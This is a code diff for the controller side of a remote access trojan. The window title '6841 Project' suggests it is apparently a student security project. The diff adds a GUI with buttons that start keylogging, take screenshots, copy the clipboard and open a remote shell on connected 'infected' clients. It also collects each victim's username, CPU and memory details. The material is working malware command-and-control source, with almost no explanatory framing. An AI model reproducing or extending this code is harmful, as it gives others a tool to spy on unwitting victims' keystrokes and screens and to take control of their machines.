@@ -20,12 +20,16 @@ typedef struct client {
     SOCKET client;
     struct sockaddr clientAddress;
     struct client* next;
+    int id;
 
 } client_t;
 
 void kill();
 void free_client_list(client_t* client);
 void window(mu_Context*, client_t* clients);
+void keylogging();
+void shell(SOCKET clientSocket);
+void screenshot(SOCKET clientSocket);
 
 const char buttonMap[256] = {
     [SDL_BUTTON_LEFT & 0xff] = MU_MOUSE_LEFT,
@@ -73,6 +77,7 @@ char userDetails[UNLEN + 1];
 // Client information
 long int clientID = 0;
 long int clientCount = 0;
+int upToId = 0;
 
 // Running
 boolean serverRunning = FALSE;
@@ -80,29 +85,39 @@ SOCKET sock;
 
 // Functions
 boolean screenshotFunction = FALSE;
-boolean shellcodeFunction = FALSE;
-boolean shellFunction = FALSE;
-char functionRunBytes[1024];
 
+boolean copyClipBoard = FALSE;
+
+// Shell functionality
+boolean shellFunction = FALSE;
+boolean shellChecker = FALSE;
+
+// Keylogging functionality
+boolean keyloggingFunction = FALSE;
+boolean keyloggingChecker = FALSE;
+boolean killKeyLogging = FALSE;
+
+char functionRunBytes[1024];
+char functionReturn[1024];
+
+// Main thread for running the client
 void client_thread(const SOCKET clientSocket) {
 
     int setupChecker = TRUE;
 
     const long int threadID = clientID;
 
-    int runThread = TRUE;
-
-    while (runThread) {
+    while (1) {
 
         if (threadID == clientID) {
-
+            // Gain client data
             if (setupChecker) {
-
                 // Gain CPU information
                 char cpuData[MAX_MEMORY_SIZE];
 
                 ZeroMemory(cpuData, sizeof(cpuData));
                 recv(clientSocket, cpuData, sizeof(cpuData), 0);
+                printf("%llu <-- memory details\n", sizeof(cpuData));
                 sprintf(cpuDetails,"%s\n", cpuData);
 
                 // Gain Clients memory information
@@ -110,23 +125,186 @@ void client_thread(const SOCKET clientSocket) {
 
                 ZeroMemory(memoryData, sizeof(memoryData));
                 recv(clientSocket, memoryData, sizeof(memoryData), 0);
+                printf("%llu <-- memory details\n", sizeof(memoryData));
                 sprintf(memoryDetails, "%s\n", memoryData);
 
                 // Gain users information
                 char userData[UNLEN + 1];
                 ZeroMemory(userData, sizeof(userData));
                 recv(clientSocket, userData, sizeof(userData), 0);
-                sprintf(userData, "%s\n", userData);
+                printf("%llu <-- memory details\n", sizeof(userData));
+                sprintf(userDetails, "%s\n", userData);
 
                 // We have now got all required information from the client, no need to do this again.
                 setupChecker = FALSE;
+            // Run the keylogger
+            } if (keyloggingChecker) {
+                ZeroMemory(functionRunBytes, sizeof(functionRunBytes));
+                sprintf(functionRunBytes,"kl");
+                send(clientSocket, functionRunBytes, sizeof(functionRunBytes), 0);
+                keyloggingFunction = TRUE;
+                keyloggingChecker = FALSE;
+                printf("Keylogging started\n");
+                CreateThread(0, 0, (LPTHREAD_START_ROUTINE)keylogging, clientSocket, 0, 0);
+            // End the keylogger
+            } else if (killKeyLogging) {
+                ZeroMemory(functionRunBytes, sizeof(functionRunBytes));
+                printf("Keylogging Stopped\n");
+                sprintf(functionRunBytes,"ks");
+                killKeyLogging = FALSE;
+                send(clientSocket, functionRunBytes, sizeof(functionRunBytes), 0);
+            // Take a screenshot
+            } else if (screenshotFunction) {
+                screenshotFunction = FALSE;
+                CreateThread(0, 0, (LPTHREAD_START_ROUTINE)screenshot, clientSocket, 0, 0);
+
+            } else if (shellChecker) {
+
+                shellChecker = FALSE;
+
+                shellFunction = TRUE;
+                HANDLE threadHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)shell, clientSocket, 0, 0);
+                if (!threadHandle) {
+                    printf("CreateThread failed with error: %d\n", GetLastError());
+                }
+            } else if (copyClipBoard) {
+                ZeroMemory(functionRunBytes, sizeof(functionRunBytes));
+                sprintf(functionRunBytes,"cc");
+                copyClipBoard = FALSE;
+                send(clientSocket, functionRunBytes, sizeof(functionRunBytes), 0);
+
+                ZeroMemory(functionReturn, sizeof(functionReturn));
+                recv(clientSocket, functionReturn, sizeof(functionReturn), 0);
+
+                printf("%s\n", functionReturn);
             }
         }
+    }
 
+}
 
-        runThread = FALSE;
+// Server logic to yoink a screenshot from the user
+void screenshot(SOCKET clientSocket) {
+    ZeroMemory(functionRunBytes, sizeof(functionRunBytes));
+    sprintf(functionRunBytes, "ss");
+    send(clientSocket, functionRunBytes, sizeof(functionRunBytes), 0);
+
+    char imageLengthBuffer[1024];
+    recv(clientSocket, imageLengthBuffer, sizeof(imageLengthBuffer), 0);
+    long imgLen = atol(imageLengthBuffer);
+    printf("\nSize of image : %ld\n", imgLen);
+
+    BYTE* img = (BYTE*)malloc(sizeof(BYTE) * imgLen);
+
+    long bytesRecieved = 0;
+    // Get indivdual image bytes, sometimes this is super slow sometimes this is instant
+    while(bytesRecieved < imgLen) {
+        bytesRecieved += (long)recv(clientSocket, img + bytesRecieved, imgLen - bytesRecieved, 0);
+        printf("\nBytes recieved: %d\n", bytesRecieved);
+    }
+
+    FILE* image;
+    image = fopen("new.bmp", "wb+");
+    fwrite(img, sizeof(BYTE), imgLen, image);
+    fclose(image);
+
+    printf("Image done processing\n");
+
+    free(img);
+
+    ExitThread(0);
+}
+
+// Create a shell interface for the infected device, requires a restart to undo
+void shell(SOCKET clientSocket) {
+
+    FreeConsole();
+    if (!AllocConsole()) {
+        printf("Failed to allocate console: %d\n", GetLastError());
+        shellChecker = FALSE;
+        return;
+    }
+
+    if (!freopen("CONIN$", "r", stdin)) {
+        printf("Failed to connin: \n");
+        shellChecker = FALSE;
+        return;
+    }
+
+    if (!freopen("CONOUT$", "w", stdout)) {
+        printf("Failed to conout: \n");
+        shellChecker = FALSE;
+        return;
+    }
+
+    HANDLE outHandle = GetStdHandle(STD_OUTPUT_HANDLE);
+
+    if (outHandle == INVALID_HANDLE_VALUE) {
+        printf("GetStdHandle failed with error: %d\n", GetLastError());
+        return; // Handle error appropriately
+    }
+
+    SetConsoleTextAttribute(outHandle, FOREGROUND_BLUE);
+
+    printf("Type q to quit shell\n");
+    SetConsoleTextAttribute(outHandle, FOREGROUND_RED);
+
+    while (shellFunction) {
+        ZeroMemory(functionRunBytes, sizeof(functionRunBytes));
+        ZeroMemory(functionReturn, sizeof(functionReturn));
+
+        printf("shell: ");
+        fgets(functionRunBytes, sizeof(functionRunBytes), stdin);
+        strtok(functionRunBytes, "\n");
+
+        printf("%s\n", functionRunBytes);
+        if (send(clientSocket, functionRunBytes, sizeof(functionRunBytes), 0) == SOCKET_ERROR) {
+            printf("Client has Disconnected.\n");
+            ExitThread(0);
+        }
+
+        printf("%s\n", functionRunBytes);
+
+        if (!strcmp(functionRunBytes, "q")) {
+            FreeConsole();
+            shellFunction = FALSE;
+            shellChecker = FALSE;
+
+            sprintf(functionRunBytes, "restart");
+            send(clientSocket, functionRunBytes, sizeof(functionRunBytes), 0);
+
+            CloseHandle(outHandle);
+            ExitThread(0);
+            return;
+        }
+
+        recv(clientSocket, functionReturn, sizeof(functionReturn), MSG_WAITALL);
+        printf("%s\n", functionReturn);
+
+        Sleep(500);
 
     }
+
+}
+
+// Logs all keystrokes and mouse strokes
+void keylogging(SOCKET clientSock) {
+    FILE* keylogging_file = fopen("keylogging.txt", "w");
+
+    char recvBuffer[1024];
+
+    while (keyloggingFunction) {
+        ZeroMemory(recvBuffer, sizeof(recvBuffer));
+
+        int result = recv(clientSock, recvBuffer, sizeof(recvBuffer), 0);
+
+        if (result <= 0) break;
+        printf("%s\n", recvBuffer);
+        fprintf(keylogging_file, "%s\n", recvBuffer);
+    }
+
+    fclose(keylogging_file);
+    ExitThread(0);
 
 }
 
@@ -138,6 +316,8 @@ __stdcall client_t* last_client(client_t* client) {
 
     return last_client(client->next);
 }
+
+// Get a given client from number
 __stdcall void grab_client(const client_t* client, const long int clientNum) {
 
     // If given client number is greater than the number of clients known to the system
@@ -145,32 +325,38 @@ __stdcall void grab_client(const client_t* client, const long int clientNum) {
         return;
     }
 
-    static long int counter;
-    counter++;
+    static long int counter = 0;
 
     if (counter == clientNum) {
         counter = 0;
-        // CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)client_thread, client->client, 0, 0));
+        CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)client_thread, client->client, 0, 0));
+    } else if (counter > clientCount) {
     } else {
+        counter++;
         grab_client(client->next, clientNum);
     }
 }
 
+// Update clients with correct info
 void update_client(client_t* clients) {
     while (serverRunning) {
         for (int x = 0; x < sizeof(num_keys) / sizeof(num_keys[0]); x++) {
             if (GetKeyState(num_keys[x]) & 0x1000) {
-                char output[1337];
+                char output[1337] = "";
+                ZeroMemory(output, sizeof(output));
                 if (num_keys[x] == 0x0D) {
                     char* end;
+                    printf("\nClient ID: %d\n", clientID);
                     clientID = strtol(output, &end, 10);
+                    printf("\nStrtol: %d", clientID);
                     sprintf(clientNumBuffer, "Click to Choose Client: ");
 
                     sprintf(userDetails, "Username: ");
                     sprintf(cpuDetails, "CPU: ");
                     sprintf(memoryDetails, "Memory: ");
 
-                    grab_client(clients->next, clientID);
+                    grab_client(clients, clientID);
+
                     return;
                 }
 
@@ -189,6 +375,29 @@ void update_client(client_t* clients) {
 // Add a client to the linked list.
 __stdcall void add_client(client_t* clients) {
 
+    if (clients->id == -1) {
+        clients->next = NULL;
+        // Listen on the socket, somaxconn is the max number of potential connections
+        listen(sock, SOMAXCONN);
+
+        int addressLength = sizeof(clients->next->clientAddress);
+
+        clients->client = accept(sock, &clients->clientAddress, &addressLength);
+        clients->id = upToId++;
+
+        // If the socket was invalid, remove the bad connection from the list to ensure that nothing goes wrong later
+        if (clients->client == INVALID_SOCKET) {
+            printf("Bad connection\n");
+            free(clients->next);
+            return;
+        }
+
+        printf("New client added. %d %d\n", clientID, clients->id);
+        clientCount++;
+
+        return;
+    }
+
     if (clients->next == NULL) {
         clients->next = (client_t*)malloc(sizeof(client_t));
         clients->next->next = NULL;
@@ -198,14 +407,16 @@ __stdcall void add_client(client_t* clients) {
         int addressLength = sizeof(clients->next->clientAddress);
 
         clients->next->client = accept(sock, &clients->next->clientAddress, &addressLength);
+        clients->next->id = upToId++;
 
         // If the socket was invalid, remove the bad connection from the list to ensure that nothing goes wrong later
         if (clients->next->client == INVALID_SOCKET) {
+            printf("Bad connection\n");
             free(clients->next);
             return;
         }
 
-        printf("New client added.\n");
+        printf("New client added. %d %d\n", clientID, clients->next->id);
         clientCount++;
     } else {
         add_client(clients->next);
@@ -213,11 +424,13 @@ __stdcall void add_client(client_t* clients) {
 
 }
 
+// Thread to add new clients
 void add_clients_runner(client_t* clients) {
 
     while (serverRunning) {
+        printf("Trying to add a client\n");
         add_client(clients);
-        Sleep(10000);
+        Sleep(100000);
     }
 
 }
@@ -246,6 +459,7 @@ int uint8_slider(mu_Context* context, unsigned char* value, int low, int high) {
     return res;
 }
 
+// Design main window, I LOVE GUI PROGRAMMING :((((((((
 void window(mu_Context* context, client_t* clients) {
     if (mu_begin_window(context, "6841 Project", mu_rect(0, 0, 750, 450))) {
         mu_Container* window = mu_get_current_container(context);
@@ -310,41 +524,55 @@ void window(mu_Context* context, client_t* clients) {
                 mu_Rect clientNumRect = mu_layout_next(context);
                 mu_draw_control_text(context, clientNumBuf, clientNumRect, MU_COLOR_TEXT, 0);
 
-                mu_layout_set_next(context, mu_rect(125, 170, 15, 15), 0);
+                mu_layout_set_next(context, mu_rect(125, 180, 15, 15), 0);
                 mu_Rect userDetailsRect = mu_layout_next(context);
                 mu_draw_control_text(context, userDetails, userDetailsRect, MU_COLOR_TEXT, 0);
 
-                mu_layout_set_next(context, mu_rect(125, 185, 15, 15), 0);
+                mu_layout_set_next(context, mu_rect(125, 195, 15, 15), 0);
                 mu_Rect cpuDetailsRect = mu_layout_next(context);
                 mu_draw_control_text(context, cpuDetails, cpuDetailsRect, MU_COLOR_TEXT, 0);
 
-                mu_layout_set_next(context, mu_rect(125, 200, 15, 15), 0);
+                mu_layout_set_next(context, mu_rect(125, 210, 15, 15), 0);
                 mu_Rect memoryDetailsRect = mu_layout_next(context);
                 mu_draw_control_text(context, memoryDetails, memoryDetailsRect, MU_COLOR_TEXT, 0);
             }
-            mu_layout_set_next(context, mu_rect(125, 210, 225, 20), 0);
+            mu_layout_set_next(context, mu_rect(125, 223, 225, 20), 0);
 
-            if (mu_header_ex(context, "========== Functions: ==========", MU_OPT_EXPANDED, 134)) {
-                mu_layout_set_next(context, mu_rect(125, 231, 225, 15), 0);
+            if (mu_header_ex(context, "   ======= Functions: ========", MU_OPT_EXPANDED, 134)) {
+                mu_layout_set_next(context, mu_rect(125, 241, 225, 15), 0);
                 if (mu_button(context, "Start a shell on a chosen client!")) {
-                    shellFunction = TRUE;
+                    shellChecker = TRUE;
                 }
 
-                mu_layout_set_next(context, mu_rect(125, 247, 225, 15), 0);
+                mu_layout_set_next(context, mu_rect(125, 257, 225, 15), 0);
                 if (mu_button(context, "Take a screenshot of a client!")) {
                     screenshotFunction = TRUE;
                 }
 
                 char commandBytesBuffer[1024] = "";
-                mu_layout_set_next(context, mu_rect(125, 263, 225, 15), 0);
+                mu_layout_set_next(context, mu_rect(125, 273, 225, 15), 0);
                 if (mu_textbox(context, commandBytesBuffer, sizeof(commandBytesBuffer)) &MU_RES_SUBMIT) {
                     mu_set_focus(context, context->last_id);
                 }
 
-                mu_layout_set_next(context, mu_rect(125, 263, 225, 15), 0);
-                if (mu_button(context, "Execute shellcode on a client!")) {
+                mu_layout_set_next(context, mu_rect(125, 273, 225, 15), 0);
+                if (mu_button(context, "Copy current clipboard!")) {
                     strcpy(functionRunBytes, commandBytesBuffer);
-                    shellcodeFunction = TRUE;
+                    copyClipBoard = TRUE;
+                }
+
+                mu_layout_set_next(context, mu_rect(125, 293, 225, 15), 0);
+                if (mu_button(context, "Begin keylogging!")) {
+                    keyloggingChecker = TRUE;
+                    printf("%d\n", keyloggingFunction);
+                }
+
+                mu_layout_set_next(context, mu_rect(125, 313, 225, 15), 0);
+                if (mu_button(context, "End keylogging!")) {
+                    keyloggingChecker = FALSE;
+                    keyloggingFunction = FALSE;
+                    killKeyLogging = TRUE;
+                    printf("%d\n", keyloggingFunction);
                 }
             }
         } else if (menuTab == 1) {
@@ -364,6 +592,7 @@ void window(mu_Context* context, client_t* clients) {
     mu_end_window(context);
 }
 
+// Create the actual window, then send it above for design and stuff
 void create_window(client_t* clients) {
 
     SDL_Init(SDL_INIT_EVERYTHING);
@@ -462,6 +691,7 @@ void kill(client_t* clients) {
     exit(EXIT_SUCCESS);
 }
 
+// Pls no memory leaks :pray:
 void free_client_list(client_t* client) {
     if (client->next == NULL) return;
 
@@ -471,9 +701,8 @@ void free_client_list(client_t* client) {
     return free(next);
 }
 
+// Setup server then run client runner and main window
 int main(int argc, char *argv[]) {
-
-    printf("Starting to run");
 
     WSADATA wsaData;
 
@@ -497,7 +726,7 @@ int main(int argc, char *argv[]) {
     hints.ai_protocol = IPPROTO_TCP;
     hints.ai_flags = AI_PASSIVE;
 
-    if (getaddrinfo(0, "50005", &hints, &ainfo) != SUCCESS) {
+    if (getaddrinfo("localhost", "50005", &hints, &ainfo) != SUCCESS) {
 
         printf("Could not get address info\n");
         Sleep(1000);
@@ -530,16 +759,13 @@ int main(int argc, char *argv[]) {
     freeaddrinfo(ainfo);
 
     client_t* clients = malloc(sizeof(client_t));
+    clients->id = -1;
     clients->next = NULL;
 
-    printf("Running");
     CreateThread(0, 0, (LPTHREAD_START_ROUTINE)add_clients_runner, clients, 0, 0);
-
-    printf("Thread made");
 
     create_window(clients);
 
-    printf("Window made");
     Sleep(100000);
 
     closesocket(sock);
